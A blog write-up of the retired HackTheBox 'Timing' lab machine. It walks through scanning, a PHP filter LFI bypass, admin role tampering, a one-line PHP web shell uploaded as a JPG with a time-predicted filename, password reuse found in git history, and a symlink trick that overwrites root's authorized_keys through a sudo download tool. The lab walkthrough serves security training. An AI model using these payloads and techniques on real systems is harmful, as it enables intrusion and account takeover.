---
title: "HackTheBox Timing Write-Up"
date: 2022-06-04
slug: hackthebox-timing-write-up
excerpt: "This is my write-up for the Timing machine on HackTheBox that just retired! Here I detail the penetration testing steps taken to scan, exploit, and privilege\u2026"
source: https://medium.com/@NicPWNs/hackthebox-timing-write-up-76c07ce2b107?source=rss-57a2a039424d------2
tags: ["hackthebox"]
---

This is my write-up for the Timing machine on HackTheBox that just retired! Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is categorized as *easy* difficulty and was retired on June 4th, 2022.

## Timing Summary

![Timing](/writeups/hackthebox-timing-write-up/img-1.png)

### Target Information

[**Machine Page**](https://app.hackthebox.com/machines/timing)  
**IP Address:** 10.10.11.135  
**Hostname:** timing.htb

### Synopsis

A local file inclusion (LFI) vulnerability on a PHP page allows for full enumeration of the web application’s PHP code. This enumeration leads to discovery of usernames for web application logon, and additional vulnerabilities in the web application. Reverse engineering the admin user functionality and a time-based file naming convention allows for arbitrary code to be uploaded and then executed using the previous LFI vulnerability. Reverse shell is not possible due to a firewall but code execution reveals a reused password for initial SSH login. Privilege escalation is possible through an insecure custom application that can be run with sudo privileges.

## Scanning

### Nmap

Nmap scans find SSH open on port 22/tcp and an HTTP webserver running on port 80/tcp.

```
# nmap -sV -sC -p- 10.10.11.135
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 18:39 EDT
Nmap scan report for 10.10.11.135
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.02 seconds
```

### HTTP (port 80/tcp)

The webserver found at port 80/tcp is a very simple login page.

![A basic login page on port 80/tcp.](/writeups/hackthebox-timing-write-up/img-2.png)

*A basic login page on port 80/tcp.*

### Nikto

Nikto scans don’t find much new information about the target.

```
# nikto --host http://10.10.11.135/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.135
+ Target Hostname:    10.10.11.135
+ Target Port:        80
+ Start Time:         2022-05-03 18:39:48 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: ./login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-05-03 18:48:10 (GMT-4) (502 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Gobuster

Gobuster reveals a number of PHP pages for us to check out.

```
# gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.135/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/04 20:35:09 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.135/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/login.php            (Status: 200) [Size: 5609]
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
/image.php            (Status: 200) [Size: 0]
/header.php           (Status: 302) [Size: 0] [--> ./login.php]
/footer.php           (Status: 200) [Size: 3937]
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.135/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.135/js/]
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]
/server-status        (Status: 403) [Size: 277]

===============================================================
2022/06/04 21:19:47 Finished
===============================================================
```

### image.php

image.php is the only page that does not redirect back to the login page. Perhaps there are some hidden URL parameters here?

![image.php not redirecting to login.](/writeups/hackthebox-timing-write-up/img-3.png)

*image.php not redirecting to login.*

### Ffuf

We can use Ffuf to scan for hidden parameters at image.php. It finds a usable parameter called img.

```
# ffuf -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/       
```

```
       v1.3.1 Kali Exclusive <3
________________________________________________
```

```
 :: Method           : GET
 :: URL              : http://10.10.11.135/image.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________
```

```
img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
:: Progress: [2588/2588] :: Job [1/1] :: 736 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

## Exploit

### Parameter

The img parameter is smart enough to not allow basic local file inclusion (LFI) and recognizes these attempts.

![LFI protections are in place.](/writeups/hackthebox-timing-write-up/img-4.png)

*LFI protections are in place.*

### PHP Filter

We can try to make use of PHP filters for a basic LFI protection bypass. This is explained [here](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/). It works and we have LFI to view /etc/passwd!

![Successful LFI of /etc/passwd.](/writeups/hackthebox-timing-write-up/img-5.png)

*Successful LFI of /etc/passwd.*

### First Login

Seeing the user aaron in /etc/passwd, we can try aaron as a username and password on the login page. This simple attempt worked!

![Logging in as aaron.](/writeups/hackthebox-timing-write-up/img-6.png)

*Logging in as aaron.*

We are now logged in as aaron.

![Successfully logged in as aaron.](/writeups/hackthebox-timing-write-up/img-7.png)

*Successfully logged in as aaron.*

### More LFI

Even logged in as aaron, we still don't have an obvious way to achieve code execution. However, we can still make use of the LFI vulnerability to view the source code of all of the PHP pages now.

### login.php

login.php points us to db\_conn.php which might contain a password for the database.

```
# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=login.php | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2764  100  2764    0     0  25005      0 --:--:-- --:--:-- --:--:-- 25127
<?php
```

```
include "header.php";
```

```
function createTimeChannel()
{
    sleep(1);
}
```

```
include "db_conn.php";
```

### db\_conn.php

db\_conn.php reveals a password! Unfortunately, this password doesn't seem to work anywhere else that we know of and we can't access the DB.

```
# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   124  100   124    0     0   1246      0 --:--:-- --:--:-- --:--:--  1252
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

### upload.php

upload.php is another PHP page to check. It shows that the page admin\_auth\_check.php is included first and then some other operations are done for file uploads. This information will be useful later.

```
# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1360  100  1360    0     0  14023      0 --:--:-- --:--:-- --:--:-- 14166
<?php
include("admin_auth_check.php");
```

```
$upload_dir = "images/uploads/";
```

```
if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}
```

```
$file_hash = uniqid();
```

```
$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
```

```
if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}
```

```
// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}
```

```
if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}
```

```
if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

### admin\_auth\_check.php

admin\_auth\_check.php finally looks like the key to the next step. It suggests that our user profile must have a role parameter set to 1 in order to pass as an admin.

```
# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   268  100   268    0     0   2627      0 --:--:-- --:--:-- --:--:--  2653
<?php
include_once "auth_check.php";
```

```
if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}
?>
```

### Set Role to Admin

Logged in as aaron, we can edit our profile which sends a few parameters to the server about our user.

![Editing the profile of aaron.](/writeups/hackthebox-timing-write-up/img-8.png)

*Editing the profile of aaron.*

Let’s intercept an update to the profile in Burp Suite. We can see the parameters passed in the POST request. If we add another parameter for role=1, this should make us an admin.

![Adding role=1 to the intercepted aaron profile edit request.](/writeups/hackthebox-timing-write-up/img-9.png)

*Adding role=1 to the intercepted aaron profile edit request.*

After forwarding the new POST request from Burp and refreshing the page, we have a new page available labeled as “Admin Panel”. This page makes use of the upload.php page we analyzed via LFI previously.

![Refreshing to see aaron is now an admin.](/writeups/hackthebox-timing-write-up/img-10.png)

*Refreshing to see aaron is now an admin.*

### Analyzing upload.php

The key part to analyze within upload.php is below. It requires a JPG file to be uploaded which gets saved to /images/uploads/ on the server. However, first it renames our file to an MD5 hash of '$file\_hash' concatenated with the current time. This MD5 hash then gets concatenated with the original name of our file for upload.

```
$upload_dir = "images/uploads/";
```

```
if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}
```

```
$file_hash = uniqid();
```

```
$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
```

```
----- SNIP -----
```

```
if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}
```

We should be able to bypass the JPG check by simply renaming our own PHP code to a JPG extension. We can then reverse engineer the time-based MD5 hashing to find the correct file name uploaded on the server to make use of our PHP code. It’s also important to note that the $file\_hash variable within the MD5 function is in single quotes and therefore will be interpreted as a string, rather than its assigned value which we would not know. We'll replicate this mistake and simply pass the string to our function as well. First, we make the JPG file containing a basic PHP web shell.

```
# cat shell.jpg
<?php system($_GET[cmd]);?>
```

Next, we simply upload our JPG file containing the PHP web shell. It is accepted because it has a .jpg extension. Intercept this upload in Burp too.

![Uploading PHP code as JPG file.](/writeups/hackthebox-timing-write-up/img-11.png)

*Uploading PHP code as JPG file.*

In Burp Suite, with the intercepted request, we can make the upload again and view the raw response from the server. This response contains the timestamp from the server which we will need to replicate the MD5 function and find our file.

![Repeating the PHP/JPG file upload in Burp to see the server’s timestamp.](/writeups/hackthebox-timing-write-up/img-12.png)

*Repeating the PHP/JPG file upload in Burp to see the server’s timestamp.*

Taking the time from Burp response from the server, we can convert it to Epoch time to be used in PHP. Using this we can then complete the concatenation with the other string to generate the MD5 hash that will match our uploaded file.

```
php > echo strtotime("Sat, 04 Jun 2022 19:27:26 GMT");
1654370846
php > echo md5('$file_hash' . strtotime("Sat, 04 Jun 2022 19:27:26 GMT"));
e22d7578e888915a1d5901f78f6cdca5
```

Now, using this MD5 hash, the concatenated underscore and our known file name, in addition to the LFI vulnerability used before, we can execute our PHP code on the server. A simple ls command shows that it works!

![Successful code execution using our PHP code.](/writeups/hackthebox-timing-write-up/img-13.png)

*Successful code execution using our PHP code.*

### Reverse Shell

After trying many different types of reverse shells in the code execution, it seems that a firewall is blocking all outbound connections. We’ll need to find another way through enumeration. After a while, I found a source-files-backup.zip file in /opt on the system.

![Finding source-files-backup.zip on the server.](/writeups/hackthebox-timing-write-up/img-14.png)

*Finding source-files-backup.zip on the server.*

To download this ZIP file, I copied it to the root of the webserver /var/www/html and downloaded it. Unzipping it shows a .git directory. Because this is a backup of the website, there may be some git history of some old passwords or other information in these files. Performing a git log shows commit history, and then viewing the specific commit for an update to the db\_conn file shows that there is an old password!

```
# git log
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000
```

```
    db_conn updated
```

```
# git show 16de2698b5b122c93461298eab730d00273bd83e
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000
```

```
    db_conn updated
```

```
diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

The other password didn’t work anywhere. Luckily in this case, the previous password of S3cr3t\_unGu3ss4bl3\_p422w0Rd was reused for SSH as aaron. We're in as a user and can grab the flag user.txt!

![Successful SSH login as aaron.](/writeups/hackthebox-timing-write-up/img-15.png)

*Successful SSH login as aaron.*

## Enumeration

### Sudo

One of the first things to always try when enumerating for privilege escalation is sudo -l. In this case it shows us that we have permissions to run a netutils executable as root.

```
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```

```
User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

### Netutils

Inside netutils we can see it runs a Java executable located in the root directory.

```
aaron@timing:~$ cat /usr/bin/netutils
#! /bin/bash
java -jar /root/netutils.jar
```

Running netutils with sudo, we can see an HTTP option that saves a remote file to aaron's home directory.

```
aaron@timing:~$ sudo netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.4/test.txt
Initializing download: http://10.10.14.4/test.txt
File size: unavailable
Opening output file test.txt
Server unsupported, starting from scratch with one connection.
Starting download
```

```
Connection 0 finished
```

````
Downloaded 0 byte in 0 seconds. (0.00 KB/s)
```
````

## Root

There are some creative ways to take advantage of writing this file as root, but one way is to add an SSH key to the root user with a symbolic link. If we set up a symlink in aaron's home directory pointing to root's authorized\_keys file, then run the netutils application and we can overwrite it as root containing our own SSH public key. First, we set up the symlink named keys.

```
aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys
aaron@timing:~$ ls -al
total 36
drwxr-x--x 5 aaron aaron 4096 Jun  4 19:53 .
drwxr-xr-x 3 root  root  4096 Dec  2  2021 ..
lrwxrwxrwx 1 root  root     9 Oct  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc
drwx------ 2 aaron aaron 4096 Nov 29  2021 .cache
drwx------ 3 aaron aaron 4096 Nov 29  2021 .gnupg
lrwxrwxrwx 1 aaron aaron   26 Jun  4 19:53 keys -> /root/.ssh/authorized_keys
```

Now, on our attacking host, we can generate an SSH key pair, copy and stage the public key with the same name as the symlink, and host it on a webserver.

![Generating SSH key, renaming and moving it, and hosting it on a webserver.](/writeups/hackthebox-timing-write-up/img-16.png)

*Generating SSH key, renaming and moving it, and hosting it on a webserver.*

Finally, running the netutils application and specifying our public key on our webserver to grab, it downloads it and overwrites the root user's authorized\_keys file through the symbolic link. Remember, we're able to do this because we can run netutils through sudo.

```
aaron@timing:~$ sudo netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.4/keys
Initializing download: http://10.10.14.4/keys
File size: 563 bytes
Opening output file keys
Server unsupported, starting from scratch with one connection.
Starting download
Downloaded 563 byte in 0 seconds. (2.75 KB/s)
```

Now, with our public SSH key configured for root and our private key already generated and on our host, we can simply SSH to the box as root! We escalated to root and can grab the root.txt flag!

![Successful SSH login as root.](/writeups/hackthebox-timing-write-up/img-17.png)

*Successful SSH login as root.*

## Loot

Other than the points on HackTheBox, the lessons learned are the real treasures for this box.

1.  One issue I ran into along the way that I did not cover in the write-up was my first attempt at reversing the time-based MD5 function. I first attempted to generate the MD5 hash using Python because I am comfortable with it. However, this caused issues because the Python time function generates Epoch time with milliseconds in a different format, resulting in a different MD5. The lesson learned was to perform the reverse engineering in the same language that the original code was in (PHP) to avoid these unexpected issues.
2.  Simple vulnerabilities/exploits used earlier in your attack chain can prove to be very useful later in the chain. In this case, we ended up using that same LFI vulnerability from the very beginning all the way to the point where we had to use it to execute our custom PHP code on the server.

Thank you for reading my write-up for the Timing machine on HackTheBox. Be sure to check out my other write-ups for [HackTheBox](/notes?tag=hackthebox)!
